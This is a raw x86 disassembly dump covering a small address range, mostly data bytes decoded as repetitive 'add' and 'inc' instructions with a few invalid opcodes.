  44c303:	adc    esp,DWORD PTR [esi]
  44c305:	(bad)  
  44c306:	call   DWORD PTR [edx]
  44c308:	es aad 0xff
  44c30b:	adc    esp,DWORD PTR [esi]
  44c30d:	(bad)  
  44c30e:	call   DWORD PTR [ebx]
  44c310:	daa    
  44c311:	xlat   BYTE PTR ds:[ebx]
  44c312:	call   DWORD PTR [edx]
  44c314:	es aad 0xff
  44c317:	adc    esp,DWORD PTR [edi]
  44c319:	(bad)  
  44c31a:	call   DWORD PTR [ebx]
  44c31c:	es (bad) 
  44c31e:	call   DWORD PTR [edx]
  44c320:	and    eax,0x101ffd4
  44c325:	add    bh,bh
  44c327:	add    DWORD PTR [ecx],eax
  44c329:	add    bh,bh
  44c32b:	add    DWORD PTR [edx],eax
  44c32d:	add    eax,0x90202ff
  44c332:	inc    DWORD PTR [ecx]
  44c334:	add    al,BYTE PTR [edx]
  44c336:	inc    DWORD PTR [ecx]
  44c338:	add    al,BYTE PTR [eax]
  44c33a:	inc    DWORD PTR [eax*1+0xff05]
  44c341:	add    bh,bh
  44c343:	add    BYTE PTR [eax],al
  44c345:	add    bh,bh
  44c347:	add    BYTE PTR [eax],al
  44c349:	add    bh,bh
  44c34b:	add    BYTE PTR [eax],al
  44c34d:	add    bh,bh
  44c34f:	add    BYTE PTR [eax],al
  44c351:	add    bh,bh
  44c353:	add    BYTE PTR [eax],al
  44c355:	add    bh,bh
  44c357:	add    BYTE PTR [eax],al
  44c359:	add    bh,bh
  44c35b:	add    BYTE PTR [eax],al
  44c35d:	add    bh,bh
  44c35f:	add    BYTE PTR [eax],al
  44c361:	add    bh,bh
  44c363:	add    BYTE PTR [eax],al
  44c365:	add    bh,bh
  44c367:	add    BYTE PTR [eax],al
  44c369:	add    bh,bh
  44c36b:	add    BYTE PTR [eax],al
  44c36d:	add    bh,bh
  44c36f:	add    BYTE PTR [eax],al
  44c371:	add    bh,bh
  44c373:	add    BYTE PTR [eax],al
  44c375:	add    bh,bh
  44c377:	add    BYTE PTR [eax],al
  44c379:	add    bh,bh
  44c37b:	add    BYTE PTR [eax],al
  44c37d:	add    bh,bh
  44c37f:	add    BYTE PTR [eax],al
  44c381:	add    bh,bh
  44c383:	add    BYTE PTR [eax],al
  44c385:	add    bh,bh
  44c387:	add    BYTE PTR [eax],al
  44c389:	add    bh,bh
  44c38b:	add    BYTE PTR [eax],al
  44c38d:	add    bh,bh
  44c38f:	add    BYTE PTR [eax],al
  44c391:	add    bh,bh
  44c393:	add    BYTE PTR [eax],al
  44c395:	add    bh,bh
  44c397:	add    BYTE PTR [eax],al
  44c399:	add    bh,bh
  44c39b:	add    BYTE PTR [eax],al
  44c39d:	add    bh,bh
  44c39f:	add    BYTE PTR [eax],al
  44c3a1:	add    bh,bh
  44c3a3:	add    BYTE PTR [eax],al
  44c3a5:	add    bh,bh
  44c3a7:	add    BYTE PTR [eax],al
  44c3a9:	add    bh,bh
  44c3ab:	add    DWORD PTR [ecx],eax
  44c3ad:	add    edi,edi
  44c3af:	add    DWORD PTR [ecx],eax
  44c3b1:	add    bh,bh
  44c3b3:	add    al,BYTE PTR [ecx]
  44c3b5:	add    edi,edi
  44c3b7:	add    DWORD PTR [ecx],eax
  44c3b9:	add    bh,bh
  44c3bb:	add    DWORD PTR [ecx],eax
  44c3bd:	add    bh,bh
  44c3bf:	add    DWORD PTR [ecx],eax
  44c3c1:	add    bh,bh
  44c3c3:	add    DWORD PTR [ecx],eax
  44c3c5:	add    bh,bh
  44c3c7:	add    DWORD PTR [ecx],eax
  44c3c9:	add    bh,bh
  44c3cb:	add    DWORD PTR [ecx],eax
  44c3cd:	add    bh,bh
  44c3cf:	add    DWORD PTR [ecx],eax
  44c3d1:	add    bh,bh
  44c3d3:	add    DWORD PTR [ecx],eax
  44c3d5:	add    bh,bh
  44c3d7:	add    DWORD PTR [ecx],eax
  44c3d9:	add    bh,bh
  44c3db:	add    DWORD PTR [ecx],eax
  44c3dd:	add    bh,bh
  44c3df:	add    BYTE PTR [eax],al
  44c3e1:	adc    edi,edi
  44c3e3:	add    BYTE PTR [eax],al
  44c3e5:	add    al,0xff
  44c3e7:	add    BYTE PTR [eax],al
  44c3e9:	add    bh,bh
  44c3eb:	add    DWORD PTR [ecx],eax
  44c3ed:	add    bh,bh
  44c3ef:	add    DWORD PTR [ecx],eax
  44c3f1:	add    bh,bh
  44c3f3:	add    DWORD PTR [ecx],eax
  44c3f5:	add    bh,bh
  44c3f7:	add    DWORD PTR [ecx],eax
  44c3f9:	add    bh,bh
  44c3fb:	add    DWORD PTR [ecx],eax
  44c3fd:	add    bh,bh
  44c3ff:	add    DWORD PTR [ecx],eax
  44c401:	add    bh,bh
  44c403:	add    DWORD PTR [ecx],eax
  44c405:	add    bh,bh
  44c407:	add    DWORD PTR [ecx],eax
  44c409:	add    bh,bh
  44c40b:	add    DWORD PTR [ecx],eax
  44c40d:	add    bh,bh
  44c40f:	add    DWORD PTR [ecx],eax
  44c411:	add    bh,bh
  44c413:	add    DWORD PTR [ecx],eax
  44c415:	add    bh,bh
  44c417:	add    DWORD PTR [ecx],eax
  44c419:	add    bh,bh
  44c41b:	add    DWORD PTR [ecx],eax
  44c41d:	add    bh,bh
  44c41f:	add    DWORD PTR [ecx],eax
  44c421:	add    edi,edi
  44c423:	add    DWORD PTR [ecx],eax
  44c425:	add    bh,bh
  44c427:	add    DWORD PTR [ecx],eax
  44c429:	add    edi,edi
  44c42b:	add    BYTE PTR [ecx],al
  44c42d:	add    edi,edi
  44c42f:	add    BYTE PTR [eax],al
  44c431:	add    edi,edi
  44c433:	add    BYTE PTR [ecx],al
  44c435:	add    edi,edi
  44c437:	add    DWORD PTR [ecx],eax
  44c439:	add    edi,edi
  44c43b:	add    BYTE PTR [eax],al
  44c43d:	add    bh,bh
  44c43f:	add    BYTE PTR [eax],al
  44c441:	add    bh,bh
  44c443:	add    BYTE PTR [eax],al
  44c445:	add    bh,bh
  44c447:	add    BYTE PTR [eax],al
  44c449:	add    bh,bh
  44c44b:	add    BYTE PTR [eax],al
  44c44d:	add    bh,bh
  44c44f:	add    BYTE PTR [eax],al
  44c451:	add    bh,bh
  44c453:	add    BYTE PTR [eax],al
  44c455:	add    bh,bh
  44c457:	add    BYTE PTR [eax],al
  44c459:	add    bh,bh
  44c45b:	add    BYTE PTR [eax],al
  44c45d:	add    bh,bh
  44c45f:	add    BYTE PTR [eax],al
  44c461:	add    bh,bh
  44c463:	add    BYTE PTR [eax],al
  44c465:	add    bh,bh
  44c467:	add    BYTE PTR [eax],al
  44c469:	add    bh,bh
  44c46b:	add    BYTE PTR [eax],al
  44c46d:	add    bh,bh
  44c46f:	add    BYTE PTR [eax],al
  44c471:	add    bh,bh
  44c473:	add    BYTE PTR [eax],al
  44c475:	add    bh,bh
  44c477:	add    BYTE PTR [eax],al
  44c479:	add    bh,bh
  44c47b:	add    BYTE PTR [eax],al
  44c47d:	add    bh,bh
  44c47f:	add    BYTE PTR [eax],al
  44c481:	add    bh,bh
  44c483:	add    BYTE PTR [eax],al
  44c485:	add    bh,bh
  44c487:	add    BYTE PTR [eax],al
  44c489:	add    bh,bh
  44c48b:	add    BYTE PTR [eax],al
  44c48d:	add    bh,bh
  44c48f:	add    BYTE PTR [eax],al
  44c491:	add    bh,bh
  44c493:	add    BYTE PTR [eax],al
  44c495:	add    bh,bh
  44c497:	add    BYTE PTR [eax],al
  44c499:	add    bh,bh
  44c49b:	add    BYTE PTR [eax],al
  44c49d:	add    bh,bh
  44c49f:	add    BYTE PTR [eax],al
  44c4a1:	add    bh,bh
  44c4a3:	add    BYTE PTR [eax],al
  44c4a5:	add    bh,bh
  44c4a7:	add    BYTE PTR [eax],al
  44c4a9:	add    bh,bh
  44c4ab:	add    BYTE PTR [eax],al
  44c4ad:	add    bh,bh
  44c4af:	add    BYTE PTR [eax],al
  44c4b1:	add    bh,bh
  44c4b3:	add    BYTE PTR [eax],al
  44c4b5:	add    bh,bh
  44c4b7:	add    BYTE PTR [eax],al
  44c4b9:	add    bh,bh
  44c4bb:	add    BYTE PTR [eax],al
  44c4bd:	add    bh,bh
  44c4bf:	add    BYTE PTR [eax],al
  44c4c1:	add    bh,bh
  44c4c3:	add    BYTE PTR [eax],al
  44c4c5:	add    bh,bh
  44c4c7:	add    BYTE PTR [eax],al
  44c4c9:	add    bh,bh
  44c4cb:	add    BYTE PTR [eax],al
  44c4cd:	add    bh,bh
  44c4cf:	add    BYTE PTR [eax],al
  44c4d1:	add    bh,bh
  44c4d3:	add    BYTE PTR [eax],al
  44c4d5:	add    bh,bh
  44c4d7:	add    BYTE PTR [eax],al
  44c4d9:	add    bh,bh
  44c4db:	add    BYTE PTR [eax],al
  44c4dd:	add    bh,bh
  44c4df:	add    BYTE PTR [eax],al
  44c4e1:	add    bh,bh
  44c4e3:	add    BYTE PTR [eax],al
  44c4e5:	add    bh,bh
  44c4e7:	add    BYTE PTR [eax],al
  44c4e9:	add    bh,bh
  44c4eb:	add    BYTE PTR [eax],al
  44c4ed:	add    bh,bh
  44c4ef:	add    BYTE PTR [eax],al
  44c4f1:	add    bh,bh
  44c4f3:	add    BYTE PTR [eax],al
  44c4f5:	add    bh,bh
  44c4f7:	add    BYTE PTR [eax],al
  44c4f9:	add    bh,bh
  44c4fb:	add    BYTE PTR [eax],al
  44c4fd:	add    bh,bh
  44c4ff:	add    BYTE PTR [eax],al
  44c501:	add    bh,bh
  44c503:	add    BYTE PTR [eax],al
  44c505:	add    bh,bh
  44c507:	add    BYTE PTR [eax],al
  44c509:	add    bh,bh
  44c50b:	add    BYTE PTR [eax],al
  44c50d:	add    bh,bh
  44c50f:	add    BYTE PTR [eax],al
  44c511:	add    bh,bh
  44c513:	add    BYTE PTR [eax],al
  44c515:	add    bh,bh
  44c517:	add    BYTE PTR [eax],al
  44c519:	add    bh,bh
  44c51b:	add    BYTE PTR [eax],al
  44c51d:	add    bh,bh
  44c51f:	add    BYTE PTR [eax],al
  44c521:	add    bh,bh
  44c523:	add    BYTE PTR [eax],al
  44c525:	add    bh,bh
  44c527:	add    BYTE PTR [eax],al
  44c529:	add    bh,bh
  44c52b:	add    BYTE PTR [eax],al
  44c52d:	add    bh,bh
  44c52f:	add    BYTE PTR [eax],al
  44c531:	add    bh,bh
  44c533:	add    BYTE PTR [eax],al
  44c535:	add    bh,bh
  44c537:	add    BYTE PTR [eax],al
  44c539:	add    bh,bh
  44c53b:	add    BYTE PTR [eax],al
  44c53d:	add    bh,bh
  44c53f:	add    BYTE PTR [eax],al
  44c541:	add    bh,bh
  44c543:	add    BYTE PTR [eax],al
  44c545:	add    bh,bh
  44c547:	add    BYTE PTR [eax],al
  44c549:	add    bh,bh
  44c54b:	add    BYTE PTR [eax],al
  44c54d:	add    bh,bh
  44c54f:	add    BYTE PTR [eax],al
  44c551:	add    bh,bh
  44c553:	add    BYTE PTR [eax],al
  44c555:	add    bh,bh
  44c557:	add    BYTE PTR [eax],al
  44c559:	add    bh,bh
  44c55b:	add    BYTE PTR [eax],al
  44c55d:	add    bh,bh
  44c55f:	add    BYTE PTR [eax],al
  44c561:	add    bh,bh
  44c563:	add    BYTE PTR [eax],al
  44c565:	add    bh,bh
  44c567:	add    BYTE PTR [eax],al
  44c569:	add    bh,bh
  44c56b:	add    BYTE PTR [eax],al
  44c56d:	add    bh,bh
  44c56f:	add    BYTE PTR [eax],al
  44c571:	add    bh,bh
  44c573:	add    BYTE PTR [eax],al
  44c575:	add    bh,bh
  44c577:	add    BYTE PTR [eax],al
  44c579:	add    bh,bh
  44c57b:	add    BYTE PTR [eax],al
  44c57d:	add    bh,bh
  44c57f:	add    BYTE PTR [eax],al
  44c581:	add    bh,bh
  44c583:	add    BYTE PTR [eax],al
  44c585:	add    bh,bh
  44c587:	add    BYTE PTR [eax],al
  44c589:	add    bh,bh
  44c58b:	add    BYTE PTR [eax],al
  44c58d:	add    bh,bh
  44c58f:	add    BYTE PTR [eax],al
  44c591:	add    bh,bh
  44c593:	add    BYTE PTR [eax],al
  44c595:	add    bh,bh
  44c597:	add    BYTE PTR [eax],al
  44c599:	add    bh,bh
  44c59b:	add    BYTE PTR [eax],al
  44c59d:	add    bh,bh
  44c59f:	add    BYTE PTR [eax],al
  44c5a1:	add    bh,bh
  44c5a3:	add    BYTE PTR [eax],al
  44c5a5:	add    bh,bh
  44c5a7:	add    BYTE PTR [eax],al
  44c5a9:	add    bh,bh
  44c5ab:	add    BYTE PTR [eax],al
  44c5ad:	add    bh,bh
  44c5af:	add    BYTE PTR [eax],al
  44c5b1:	add    bh,bh
  44c5b3:	add    BYTE PTR [eax],al
  44c5b5:	add    bh,bh
  44c5b7:	add    BYTE PTR [eax],al
  44c5b9:	add    bh,bh
  44c5bb:	add    BYTE PTR [eax],al
  44c5bd:	add    bh,bh
  44c5bf:	add    BYTE PTR [eax],al
  44c5c1:	add    bh,bh
  44c5c3:	add    BYTE PTR [eax],al
  44c5c5:	add    bh,bh
  44c5c7:	add    BYTE PTR [eax],al
  44c5c9:	add    bh,bh
  44c5cb:	add    BYTE PTR [eax],al
  44c5cd:	add    bh,bh
  44c5cf:	add    BYTE PTR [eax],al
  44c5d1:	add    bh,bh
  44c5d3:	add    BYTE PTR [eax],al
  44c5d5:	add    bh,bh
  44c5d7:	add    BYTE PTR [eax],al
  44c5d9:	add    bh,bh
  44c5db:	add    BYTE PTR [eax],al
  44c5dd:	add    bh,bh
  44c5df:	add    BYTE PTR [eax],al
  44c5e1:	add    bh,bh
  44c5e3:	add    BYTE PTR [eax],al
  44c5e5:	add    bh,bh
  44c5e7:	add    BYTE PTR [eax],al
  44c5e9:	add    bh,bh
  44c5eb:	add    BYTE PTR [eax],al
  44c5ed:	add    bh,bh
  44c5ef:	add    BYTE PTR [eax],al
  44c5f1:	add    bh,bh
  44c5f3:	add    BYTE PTR [eax],al
  44c5f5:	add    bh,bh
  44c5f7:	add    BYTE PTR [eax],al
  44c5f9:	add    bh,bh
  44c5fb:	add    BYTE PTR [eax],al
  44c5fd:	add    bh,bh
  44c5ff:	add    BYTE PTR [eax],al
  44c601:	add    bh,bh
  44c603:	add    BYTE PTR [eax],al
  44c605:	add    bh,bh
  44c607:	add    BYTE PTR [eax],al
  44c609:	add    bh,bh
  44c60b:	add    BYTE PTR [eax],al
  44c60d:	add    bh,bh
  44c60f:	add    BYTE PTR [eax],al
  44c611:	add    bh,bh
  44c613:	add    BYTE PTR [eax],al
  44c615:	add    bh,bh
  44c617:	add    BYTE PTR [eax],al
  44c619:	add    bh,bh
  44c61b:	add    BYTE PTR [eax],al
  44c61d:	add    bh,bh
  44c61f:	add    BYTE PTR [eax],al
  44c621:	add    bh,bh
  44c623:	add    BYTE PTR [eax],al
  44c625:	add    bh,bh
  44c627:	add    BYTE PTR [eax],al
  44c629:	add    bh,bh
  44c62b:	add    BYTE PTR [eax],al
  44c62d:	add    bh,bh
  44c62f:	add    BYTE PTR [eax],al
  44c631:	add    bh,bh
  44c633:	add    BYTE PTR [eax],al
  44c635:	add    bh,bh
  44c637:	add    BYTE PTR [eax],al
  44c639:	add    bh,bh
  44c63b:	add    BYTE PTR [eax],al
  44c63d:	add    bh,bh
  44c63f:	add    BYTE PTR [eax],al
  44c641:	add    bh,bh
  44c643:	add    BYTE PTR [eax],al
  44c645:	add    bh,bh
  44c647:	add    BYTE PTR [eax],al
  44c649:	add    bh,bh
  44c64b:	add    BYTE PTR [eax],al
  44c64d:	add    bh,bh
  44c64f:	add    BYTE PTR [eax],al
  44c651:	add    bh,bh
  44c653:	add    BYTE PTR [eax],al
  44c655:	add    bh,bh
  44c657:	add    BYTE PTR [eax],al
  44c659:	add    bh,bh
  44c65b:	add    BYTE PTR [eax],al
  44c65d:	add    bh,bh
  44c65f:	add    BYTE PTR [eax],al
  44c661:	add    bh,bh
  44c663:	add    BYTE PTR [eax],al
  44c665:	add    bh,bh
  44c667:	add    BYTE PTR [eax],al
  44c669:	add    bh,bh
  44c66b:	add    al,BYTE PTR [ecx]
  44c66d:	add    esi,edi
  44c66f:	add    BYTE PTR [eax],al
  44c671:	add    bh,bh
  44c673:	add    BYTE PTR [eax],al
  44c675:	add    bh,bh
  44c677:	add    BYTE PTR [eax],al
  44c679:	add    bh,bh
  44c67b:	add    BYTE PTR [eax],al
  44c67d:	add    bh,bh
  44c67f:	add    BYTE PTR [eax],al
  44c681:	add    bh,bh
  44c683:	add    BYTE PTR [eax],al
  44c685:	add    bh,bh
  44c687:	add    BYTE PTR [eax],al
  44c689:	add    bh,bh
  44c68b:	add    BYTE PTR [eax],al
  44c68d:	add    bh,bh
  44c68f:	add    BYTE PTR [eax],al
  44c691:	add    bh,bh
  44c693:	add    BYTE PTR [eax],al
  44c695:	add    bh,bh
  44c697:	add    BYTE PTR [eax],al
  44c699:	add    bh,bh
  44c69b:	add    BYTE PTR [eax],al
  44c69d:	add    bh,bh
  44c69f:	add    BYTE PTR [eax],al
  44c6a1:	add    bh,bh
  44c6a3:	add    BYTE PTR [eax],al
  44c6a5:	add    bh,bh
  44c6a7:	add    BYTE PTR [eax],al
  44c6a9:	add    bh,bh
  44c6ab:	add    BYTE PTR [eax],al
  44c6ad:	add    bh,bh
  44c6af:	add    BYTE PTR [eax],al
  44c6b1:	add    bh,bh
  44c6b3:	add    BYTE PTR [eax],al
  44c6b5:	add    bh,bh
  44c6b7:	add    BYTE PTR [eax],al
  44c6b9:	add    bh,bh
  44c6bb:	add    BYTE PTR [eax],al
  44c6bd:	add    bh,bh
  44c6bf:	add    BYTE PTR [eax],al
  44c6c1:	add    bh,bh
  44c6c3:	add    BYTE PTR [eax],al
  44c6c5:	add    bh,bh
  44c6c7:	add    BYTE PTR [eax],al
  44c6c9:	add    bh,bh
  44c6cb:	add    BYTE PTR [eax],al
  44c6cd:	add    bh,bh
  44c6cf:	add    BYTE PTR [eax],al
  44c6d1:	add    bh,bh
  44c6d3:	add    BYTE PTR [eax],al
  44c6d5:	add    bh,bh
  44c6d7:	add    BYTE PTR [eax],al
  44c6d9:	add    bh,bh
  44c6db:	add    BYTE PTR [eax],al
  44c6dd:	add    bh,bh
  44c6df:	add    BYTE PTR [eax],al
  44c6e1:	add    bh,bh
  44c6e3:	add    BYTE PTR [eax],al
  44c6e5:	add    bh,bh
  44c6e7:	add    BYTE PTR [eax],al
  44c6e9:	add    bh,bh
  44c6eb:	add    BYTE PTR [eax],al
  44c6ed:	add    bh,bh
  44c6ef:	add    BYTE PTR [eax],al
  44c6f1:	add    bh,bh
  44c6f3:	add    BYTE PTR [eax],al
  44c6f5:	add    bh,bh
  44c6f7:	add    BYTE PTR [eax],al
  44c6f9:	add    bh,bh
  44c6fb:	add    BYTE PTR [eax],al
  44c6fd:	add    bh,bh
  44c6ff:	add    BYTE PTR [eax],al
  44c701:	add    bh,bh
  44c703:	add    BYTE PTR [eax],al
  44c705:	add    bh,bh
  44c707:	add    BYTE PTR [eax],al
  44c709:	add    bh,bh
  44c70b:	add    BYTE PTR [eax],al
  44c70d:	add    bh,bh
  44c70f:	add    BYTE PTR [eax],al
  44c711:	add    bh,bh
  44c713:	add    BYTE PTR [eax],al
  44c715:	add    bh,bh
  44c717:	add    BYTE PTR [eax],al
  44c719:	add    bh,bh
  44c71b:	add    BYTE PTR [eax],al
  44c71d:	add    bh,bh
  44c71f:	add    BYTE PTR [eax],al
  44c721:	add    bh,bh
  44c723:	add    BYTE PTR [ecx],al
  44c725:	add    bh,bh
  44c727:	add    BYTE PTR [eax],al
  44c729:	add    bh,bh
  44c72b:	add    BYTE PTR [eax],al
  44c72d:	add    bh,bh
  44c72f:	add    BYTE PTR [eax],al
  44c731:	add    bh,bh
  44c733:	add    BYTE PTR [eax],al
  44c735:	add    bh,bh
  44c737:	add    BYTE PTR [eax],al
  44c739:	add    bh,bh
  44c73b:	add    BYTE PTR [eax],al
  44c73d:	add    bh,bh
  44c73f:	add    BYTE PTR [eax],al
  44c741:	add    bh,bh
  44c743:	add    BYTE PTR [eax],al
  44c745:	add    bh,bh
  44c747:	add    BYTE PTR [eax],al
  44c749:	add    bh,bh
  44c74b:	add    BYTE PTR [eax],al
  44c74d:	add    bh,bh
  44c74f:	add    BYTE PTR [eax],al
  44c751:	add    bh,bh
  44c753:	add    BYTE PTR [eax],al
  44c755:	add    bh,bh
  44c757:	add    BYTE PTR [eax],al
  44c759:	add    bh,bh
  44c75b:	add    BYTE PTR [eax],al
  44c75d:	add    bh,bh
  44c75f:	add    BYTE PTR [eax],al
  44c761:	add    bh,bh
  44c763:	add    BYTE PTR [eax],al
  44c765:	add    bh,bh
  44c767:	add    BYTE PTR [eax],al
  44c769:	add    bh,bh
  44c76b:	adc    BYTE PTR [edi],cl
  44c76d:	psubb  mm0,QWORD PTR [eax]
  44c770:	add    BYTE PTR [eax],al
  44c772:	inc    DWORD PTR [eax]
  44c774:	add    BYTE PTR [eax],al
  44c776:	inc    DWORD PTR [eax]
  44c778:	add    BYTE PTR [eax],al
  44c77a:	inc    DWORD PTR [eax]
  44c77c:	add    BYTE PTR [eax],al
  44c77e:	inc    DWORD PTR [eax]
  44c780:	add    BYTE PTR [eax],al
  44c782:	inc    DWORD PTR [eax]
  44c784:	add    BYTE PTR [eax],al
  44c786:	inc    DWORD PTR [eax]
  44c788:	add    BYTE PTR [eax],al
  44c78a:	inc    DWORD PTR [eax]
  44c78c:	add    BYTE PTR [eax],al
  44c78e:	inc    DWORD PTR [eax]
  44c790:	add    BYTE PTR [eax],al
  44c792:	inc    DWORD PTR [eax]
  44c794:	add    BYTE PTR [eax],al
  44c796:	inc    DWORD PTR [eax]
  44c798:	add    BYTE PTR [eax],al
  44c79a:	inc    DWORD PTR [eax]
  44c79c:	add    BYTE PTR [eax],al
  44c79e:	inc    DWORD PTR [eax]
  44c7a0:	add    BYTE PTR [eax],al
  44c7a2:	inc    DWORD PTR [eax]
  44c7a4:	add    BYTE PTR [eax],al
  44c7a6:	inc    DWORD PTR [eax]
  44c7a8:	add    BYTE PTR [eax],al
  44c7aa:	inc    DWORD PTR [eax]
  44c7ac:	add    BYTE PTR [eax],al
  44c7ae:	inc    DWORD PTR [eax]
  44c7b0:	add    BYTE PTR [eax],al
  44c7b2:	inc    DWORD PTR [eax]
  44c7b4:	add    BYTE PTR [eax],al
  44c7b6:	inc    DWORD PTR [eax]
  44c7b8:	add    BYTE PTR [eax],al
  44c7ba:	inc    DWORD PTR [eax]
  44c7bc:	add    BYTE PTR [eax],al
  44c7be:	inc    DWORD PTR [eax]
  44c7c0:	add    BYTE PTR [eax],al
  44c7c2:	inc    DWORD PTR [eax]
  44c7c4:	add    BYTE PTR [eax],al
  44c7c6:	inc    DWORD PTR [eax]
  44c7c8:	add    BYTE PTR [eax],al
  44c7ca:	inc    DWORD PTR [eax]
  44c7cc:	add    BYTE PTR [eax],al
  44c7ce:	inc    DWORD PTR [eax]
  44c7d0:	add    BYTE PTR [eax],al
  44c7d2:	inc    DWORD PTR [eax]
  44c7d4:	add    BYTE PTR [eax],al
  44c7d6:	inc    DWORD PTR [eax]
  44c7d8:	add    BYTE PTR [eax],al
  44c7da:	inc    DWORD PTR [eax]
  44c7dc:	add    BYTE PTR [eax],al
  44c7de:	inc    DWORD PTR [eax]
  44c7e0:	add    BYTE PTR [eax],al
  44c7e2:	inc    DWORD PTR [eax]
  44c7e4:	add    BYTE PTR [eax],al
  44c7e6:	inc    DWORD PTR [eax]
  44c7e8:	add    BYTE PTR [eax],al
  44c7ea:	inc    DWORD PTR [eax]
  44c7ec:	add    BYTE PTR [eax],al
  44c7ee:	inc    DWORD PTR [eax]
  44c7f0:	add    BYTE PTR [eax],al
  44c7f2:	inc    DWORD PTR [eax]
  44c7f4:	add    BYTE PTR [eax],al
  44c7f6:	inc    DWORD PTR [eax]
  44c7f8:	add    BYTE PTR [eax],al
  44c7fa:	inc    DWORD PTR [eax]
  44c7fc:	add    BYTE PTR [eax],al
  44c7fe:	inc    DWORD PTR [eax]
  44c800:	add    BYTE PTR [eax],al
  44c802:	inc    DWORD PTR [eax]
  44c804:	add    BYTE PTR [eax],al
  44c806:	inc    DWORD PTR [eax]
  44c808:	add    BYTE PTR [eax],al
  44c80a:	inc    DWORD PTR [eax]
  44c80c:	add    BYTE PTR [eax],al
  44c80e:	inc    DWORD PTR [eax]
  44c810:	add    BYTE PTR [eax],al
  44c812:	inc    DWORD PTR [eax]
  44c814:	add    BYTE PTR [eax],al
  44c816:	inc    DWORD PTR [eax]
  44c818:	add    BYTE PTR [eax],al
  44c81a:	inc    DWORD PTR [eax]
  44c81c:	add    BYTE PTR [eax],al
  44c81e:	inc    DWORD PTR [eax]
  44c820:	add    BYTE PTR [eax],al
  44c822:	inc    DWORD PTR [eax]
  44c824:	add    BYTE PTR [eax],al
  44c826:	inc    DWORD PTR [eax]
  44c828:	add    BYTE PTR [eax],al
  44c82a:	inc    DWORD PTR [eax]
  44c82c:	add    BYTE PTR [eax],al
  44c82e:	inc    DWORD PTR [eax]
  44c830:	add    BYTE PTR [eax],al
  44c832:	inc    DWORD PTR [eax]
  44c834:	add    BYTE PTR [eax],al
  44c836:	inc    DWORD PTR [eax]
  44c838:	add    BYTE PTR [eax],al
  44c83a:	inc    DWORD PTR [eax]
  44c83c:	add    BYTE PTR [eax],al
  44c83e:	inc    DWORD PTR [eax]
  44c840:	add    BYTE PTR [eax],al
  44c842:	inc    DWORD PTR [eax]
  44c844:	add    BYTE PTR [eax],al
  44c846:	inc    DWORD PTR [eax]
  44c848:	add    BYTE PTR [eax],al
  44c84a:	inc    DWORD PTR [eax]
  44c84c:	add    BYTE PTR [eax],al
  44c84e:	inc    DWORD PTR [eax]
  44c850:	add    BYTE PTR [eax],al
  44c852:	inc    DWORD PTR [eax]
  44c854:	add    BYTE PTR [eax],al
  44c856:	inc    DWORD PTR [eax]
  44c858:	add    BYTE PTR [eax],al
  44c85a:	inc    DWORD PTR [eax]
  44c85c:	add    BYTE PTR [eax],al
  44c85e:	inc    DWORD PTR [eax]
  44c860:	add    BYTE PTR [eax],al
  44c862:	inc    DWORD PTR [eax]
  44c864:	add    BYTE PTR [eax],al
  44c866:	inc    DWORD PTR [eax]
  44c868:	add    BYTE PTR [eax],al
  44c86a:	jmp    FWORD PTR [edx]
  44c86c:	and    eax,0xd0fcc25
  44c871:	or     eax,0xe3
  44c876:	inc    DWORD PTR [eax]
  44c878:	add    BYTE PTR [eax],al
  44c87a:	inc    DWORD PTR [eax]
  44c87c:	add    BYTE PTR [eax],al
  44c87e:	inc    DWORD PTR [eax]
  44c880:	add    BYTE PTR [eax],al
  44c882:	inc    DWORD PTR [eax]
  44c884:	add    BYTE PTR [eax],al
  44c886:	inc    DWORD PTR [eax]
  44c888:	add    BYTE PTR [eax],al
  44c88a:	inc    DWORD PTR [eax]
  44c88c:	add    BYTE PTR [eax],al
  44c88e:	inc    DWORD PTR [eax]
  44c890:	add    BYTE PTR [eax],al
  44c892:	inc    DWORD PTR [eax]
  44c894:	add    BYTE PTR [eax],al
  44c896:	inc    DWORD PTR [eax]
  44c898:	add    BYTE PTR [eax],al
  44c89a:	inc    DWORD PTR [eax]
  44c89c:	add    BYTE PTR [eax],al
  44c89e:	inc    DWORD PTR [eax]
  44c8a0:	add    BYTE PTR [eax],al
  44c8a2:	inc    DWORD PTR [eax]
  44c8a4:	add    BYTE PTR [eax],al
  44c8a6:	inc    DWORD PTR [eax]
  44c8a8:	add    BYTE PTR [eax],al
  44c8aa:	inc    DWORD PTR [eax]
  44c8ac:	add    BYTE PTR [eax],al
  44c8ae:	inc    DWORD PTR [eax]
  44c8b0:	add    BYTE PTR [eax],al
  44c8b2:	inc    DWORD PTR [eax]
  44c8b4:	add    BYTE PTR [eax],al
  44c8b6:	inc    DWORD PTR [eax]
  44c8b8:	add    BYTE PTR [eax],al
  44c8ba:	inc    DWORD PTR [eax]
  44c8bc:	add    BYTE PTR [eax],al
  44c8be:	inc    DWORD PTR [eax]
  44c8c0:	add    BYTE PTR [eax],al
  44c8c2:	inc    DWORD PTR [eax]
  44c8c4:	add    BYTE PTR [eax],al
  44c8c6:	inc    DWORD PTR [eax]
  44c8c8:	add    BYTE PTR [eax],al
  44c8ca:	inc    DWORD PTR [eax]
  44c8cc:	add    BYTE PTR [eax],al
  44c8ce:	inc    DWORD PTR [eax]
  44c8d0:	add    BYTE PTR [eax],al
  44c8d2:	inc    DWORD PTR [eax]
  44c8d4:	add    BYTE PTR [eax],al
  44c8d6:	inc    DWORD PTR [eax]
  44c8d8:	add    BYTE PTR [eax],al
  44c8da:	inc    DWORD PTR [eax]
  44c8dc:	add    BYTE PTR [eax],al
  44c8de:	inc    DWORD PTR [eax]
  44c8e0:	add    BYTE PTR [eax],al
  44c8e2:	inc    DWORD PTR [eax]
  44c8e4:	add    BYTE PTR [eax],al
  44c8e6:	inc    DWORD PTR [eax]
  44c8e8:	add    BYTE PTR [eax],al
  44c8ea:	inc    DWORD PTR [eax]
  44c8ec:	add    BYTE PTR [eax],al
  44c8ee:	inc    DWORD PTR [eax]
  44c8f0:	add    BYTE PTR [eax],al
  44c8f2:	inc    DWORD PTR [eax]
  44c8f4:	add    BYTE PTR [eax],al
  44c8f6:	inc    DWORD PTR [eax]
  44c8f8:	add    BYTE PTR [eax],al
  44c8fa:	inc    DWORD PTR [eax]
  44c8fc:	add    BYTE PTR [eax],al
  44c8fe:	inc    DWORD PTR [eax]
  44c900:	add    BYTE PTR [eax],al
  44c902:	inc    DWORD PTR [eax]
  44c904:	add    BYTE PTR [eax],al
  44c906:	inc    DWORD PTR [eax]
  44c908:	add    BYTE PTR [eax],al
  44c90a:	inc    DWORD PTR [eax]
  44c90c:	add    BYTE PTR [eax],al
  44c90e:	inc    DWORD PTR [eax]
